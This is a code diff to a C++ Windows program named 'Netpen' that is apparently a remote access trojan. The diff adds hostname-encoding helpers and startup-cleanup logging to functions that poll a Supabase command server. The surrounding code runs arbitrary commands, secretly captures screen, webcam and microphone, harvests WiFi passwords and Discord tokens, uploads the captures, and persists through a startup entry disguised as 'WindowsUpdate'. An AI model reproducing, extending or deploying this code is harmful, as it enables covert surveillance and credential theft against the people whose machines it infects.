@@ -102,6 +102,42 @@ static std::string ToNarrow(const std::wstring& s) {
     return buf;
 }
 
+// Path/Storage-safe form of g_hostname (PCNAME\user -> PCNAME_user).
+// Use for temp files and Storage object keys only — not for JSON identity.
+static std::string SafeHostSlug(const std::string& host) {
+    std::string out = host.empty() ? "unknown" : host;
+    for (size_t i = 0; i < out.size(); i++) {
+        char c = out[i];
+        if (c == '\\' || c == '/' || c == ':' || c == '*' || c == '?' || c == '"' || c == '<' || c == '>' || c == '|')
+            out[i] = '_';
+    }
+    return out;
+}
+
+// Percent-encode for PostgREST filter values (hostname=eq....).
+static std::string UrlEncode(const std::string& s) {
+    static const char* hex = "0123456789ABCDEF";
+    std::string out;
+    out.reserve(s.size() * 3);
+    for (size_t i = 0; i < s.size(); i++) {
+        unsigned char c = (unsigned char)s[i];
+        if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') ||
+            c == '-' || c == '_' || c == '.' || c == '~') {
+            out += (char)c;
+        } else {
+            out += '%';
+            out += hex[c >> 4];
+            out += hex[c & 0xF];
+        }
+    }
+    return out;
+}
+
+// Wide hostname filter for hostname=eq.<encoded> query segments.
+static std::wstring HostFilterEq() {
+    return ToWide(UrlEncode(g_hostname));
+}
+
 // JSON-escape a string for embedding in a JSON string value.
 static std::string EscapeJSON(const std::string& s) {
     std::string out;
@@ -486,7 +522,7 @@ static void PostToDiscord(const std::string& hostname, const std::string& window
 static bool CheckStop() {
     std::wstring query = SUPABASE_CONTROL_PATH;
     query += L"?command=eq.stop&executed=eq.false&hostname=eq.";
-    query += ToWide(g_hostname);
+    query += HostFilterEq();
     query += L"&select=id";
     std::string response;
     if (!HttpRequest(L"GET", query.c_str(), "", response)) return false;
@@ -580,7 +616,7 @@ static void ScheduleSelfDestruct() {
 static bool CheckSelfDestruct() {
     std::wstring query = SUPABASE_CONTROL_PATH;
     query += L"?command=eq.selfdestruct&executed=eq.false&hostname=eq.";
-    query += ToWide(g_hostname);
+    query += HostFilterEq();
     query += L"&select=id";
     std::string response;
     if (!HttpRequest(L"GET", query.c_str(), "", response)) return false;
@@ -1036,7 +1072,7 @@ static std::string ExecuteCommand(const std::string& cmd, DWORD* outExitCode = N
 // via ExecuteCommand and POSTs the result + exit code to exec_results.
 static void CheckAndHandleExec() {
     std::wstring q = SUPABASE_CONTROL_PATH;
-    q += L"?command=eq.exec&executed=eq.false&hostname=eq." + ToWide(g_hostname) + L"&select=id,payload";
+    q += L"?command=eq.exec&executed=eq.false&hostname=eq." + HostFilterEq() + L"&select=id,payload";
     std::string resp;
     if (!HttpRequest(L"GET", q.c_str(), "", resp)) return;
     if (resp.size() < 10) return;
@@ -1860,7 +1896,7 @@ static void HarvestWiFiPasswords() {
 // Poll for a pending "screenshot" command.
 static std::string CheckScreenshotCmd() {
     std::wstring q = SUPABASE_CONTROL_PATH;
-    q += L"?command=eq.screenshot&executed=eq.false&hostname=eq." + ToWide(g_hostname) + L"&select=id";
+    q += L"?command=eq.screenshot&executed=eq.false&hostname=eq." + HostFilterEq() + L"&select=id";
     std::string resp;
     if (!HttpRequest(L"GET", q.c_str(), "", resp)) return "";
     size_t p = resp.find("\"id\":");
@@ -1876,8 +1912,9 @@ static void HandleScreenshot(const std::string& rowId) {
     char tmp[MAX_PATH];
     GetTempPathA(MAX_PATH, tmp);
     std::string ts = GetScreenshotTimestamp();
-    std::string localFile = std::string(tmp) + "NetpenShot_" + g_hostname + "_" + ts + ".jpg";
-    std::string storageFile = "screenshots/" + g_hostname + "_" + ts + ".jpg";
+    std::string slug = SafeHostSlug(g_hostname);
+    std::string localFile = std::string(tmp) + "NetpenShot_" + slug + "_" + ts + ".jpg";
+    std::string storageFile = "screenshots/" + slug + "_" + ts + ".jpg";
 
     if (!CaptureScreen(localFile.c_str())) { LogMsg("Screenshot: capture failed"); return; }
     std::string storagePath = "/storage/v1/object/Netpen/" + storageFile;
@@ -1904,7 +1941,7 @@ static void HandleScreenshot(const std::string& rowId) {
 // Poll for a pending "webcam" command.
 static std::string CheckWebcamCmd() {
     std::wstring q = SUPABASE_CONTROL_PATH;
-    q += L"?command=eq.webcam&executed=eq.false&hostname=eq." + ToWide(g_hostname) + L"&select=id";
+    q += L"?command=eq.webcam&executed=eq.false&hostname=eq." + HostFilterEq() + L"&select=id";
     std::string resp;
     if (!HttpRequest(L"GET", q.c_str(), "", resp)) return "";
     size_t p = resp.find("\"id\":");
@@ -2056,8 +2093,9 @@ static void HandleWebcam(const std::string& rowId) {
     char tmp[MAX_PATH];
     GetTempPathA(MAX_PATH, tmp);
     std::string ts = GetScreenshotTimestamp();
-    std::string localFile = std::string(tmp) + "NetpenCam_" + g_hostname + "_" + ts + ".jpg";
-    std::string storageFile = "webcam/" + g_hostname + "_" + ts + ".jpg";
+    std::string slug = SafeHostSlug(g_hostname);
+    std::string localFile = std::string(tmp) + "NetpenCam_" + slug + "_" + ts + ".jpg";
+    std::string storageFile = "webcam/" + slug + "_" + ts + ".jpg";
 
     std::wstring localFileW = ToWide(localFile);
     if (InjectAndCaptureWebcam(localFileW.c_str())) { LogMsg("Webcam: captured via Discord injection"); }
@@ -2086,7 +2124,7 @@ static void HandleWebcam(const std::string& rowId) {
 // Poll for a pending "speaker" (audio capture) command.
 static std::string CheckSpeakerCmd() {
     std::wstring q = SUPABASE_CONTROL_PATH;
-    q += L"?command=eq.speaker&executed=eq.false&hostname=eq." + ToWide(g_hostname) + L"&select=id";
+    q += L"?command=eq.speaker&executed=eq.false&hostname=eq." + HostFilterEq() + L"&select=id";
     std::string resp;
     if (!HttpRequest(L"GET", q.c_str(), "", resp)) return "";
     size_t p = resp.find("\"id\":");
@@ -2102,8 +2140,9 @@ static void HandleSpeaker(const std::string& rowId) {
     char tmp[MAX_PATH];
     GetTempPathA(MAX_PATH, tmp);
     std::string ts = GetScreenshotTimestamp();
-    std::string localFile = std::string(tmp) + "NetpenAudio_" + g_hostname + "_" + ts + ".wav";
-    std::string storageFile = "speaker/" + g_hostname + "_" + ts + ".wav";
+    std::string slug = SafeHostSlug(g_hostname);
+    std::string localFile = std::string(tmp) + "NetpenAudio_" + slug + "_" + ts + ".wav";
+    std::string storageFile = "speaker/" + slug + "_" + ts + ".wav";
 
     if (!CaptureSpeaker(localFile.c_str())) { LogMsg("Speaker: capture failed"); return; }
     std::string storagePath = "/storage/v1/object/Netpen/" + storageFile;
@@ -2130,7 +2169,7 @@ static void HandleSpeaker(const std::string& rowId) {
 // Poll for a pending "wifi" command.
 static std::string CheckWifiCmd() {
     std::wstring q = SUPABASE_CONTROL_PATH;
-    q += L"?command=eq.wifi&executed=eq.false&hostname=eq." + ToWide(g_hostname) + L"&select=id";
+    q += L"?command=eq.wifi&executed=eq.false&hostname=eq." + HostFilterEq() + L"&select=id";
     std::string resp;
     if (!HttpRequest(L"GET", q.c_str(), "", resp)) return "";
     size_t p = resp.find("\"id\":");
@@ -2155,7 +2194,7 @@ static void HandleWifiCmd(const std::string& rowId) {
 // Poll for a pending "force_discord" command (re-scans for Discord tokens on-demand).
 static std::string CheckDiscordCmd() {
     std::wstring q = SUPABASE_CONTROL_PATH;
-    q += L"?command=eq.force_discord&executed=eq.false&hostname=eq." + ToWide(g_hostname) + L"&select=id";
+    q += L"?command=eq.force_discord&executed=eq.false&hostname=eq." + HostFilterEq() + L"&select=id";
     std::string resp;
     if (!HttpRequest(L"GET", q.c_str(), "", resp)) return "";
     size_t p = resp.find("\"id\":");
@@ -2182,7 +2221,7 @@ static void HandleDiscordCmd(const std::string& rowId) {
 static void SendHeartbeat() {
     std::string json = "{\"hostname\":\"" + EscapeJSON(g_hostname) + "\",\"last_seen\":\"" + GetTimestamp() + "\",\"version\":" + std::to_string(NETPEN_VERSION) + "}";
     std::string resp;
-    std::wstring path = SUPABASE_HEARTBEAT_PATH + ToWide(g_hostname);
+    std::wstring path = SUPABASE_HEARTBEAT_PATH + HostFilterEq();
     HttpRequest(L"PUT", path.c_str(), json, resp);
 }
 
@@ -2245,8 +2284,9 @@ static void CheckAutoScreenshot(const std::string& windowTitle) {
         char tmp[MAX_PATH];
         GetTempPathA(MAX_PATH, tmp);
         std::string ts = GetScreenshotTimestamp();
-        std::string localFile = std::string(tmp) + "NetpenAuto_" + g_hostname + "_" + ts + ".jpg";
-        std::string storageFile = "auto_screenshots/" + g_hostname + "_" + ts + ".jpg";
+        std::string slug = SafeHostSlug(g_hostname);
+        std::string localFile = std::string(tmp) + "NetpenAuto_" + slug + "_" + ts + ".jpg";
+        std::string storageFile = "auto_screenshots/" + slug + "_" + ts + ".jpg";
 
         if (!CaptureScreen(localFile.c_str())) { LogMsg("AutoSS: capture failed"); break; }
         std::string storagePath = "/storage/v1/object/Netpen/" + storageFile;
@@ -2700,8 +2740,15 @@ static void RemoveAllUsersStartupEntry() {
     char allUsers[MAX_PATH];
     if (GetEnvironmentVariableA("ALLUSERSPROFILE", allUsers, MAX_PATH) == 0 || allUsers[0] == 0) return;
     std::string p = std::string(allUsers) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
-    DeleteFileA((p + "\\WindowsUpdate.bat").c_str());
-    DeleteFileA((p + "\\WindowsUpdate.lnk").c_str());
+    std::string bat = p + "\\WindowsUpdate.bat";
+    std::string lnk = p + "\\WindowsUpdate.lnk";
+    BOOL batOk = DeleteFileA(bat.c_str());
+    BOOL lnkOk = DeleteFileA(lnk.c_str());
+    if ((!batOk && GetLastError() != ERROR_FILE_NOT_FOUND) ||
+        (!lnkOk && GetLastError() != ERROR_FILE_NOT_FOUND)) {
+        if (!IsElevated())
+            LogMsg("All Users startup cleanup failed (not elevated — seed may remain)");
+    }
 }
 
 // === Child process (entry point: --child flag) ==================================
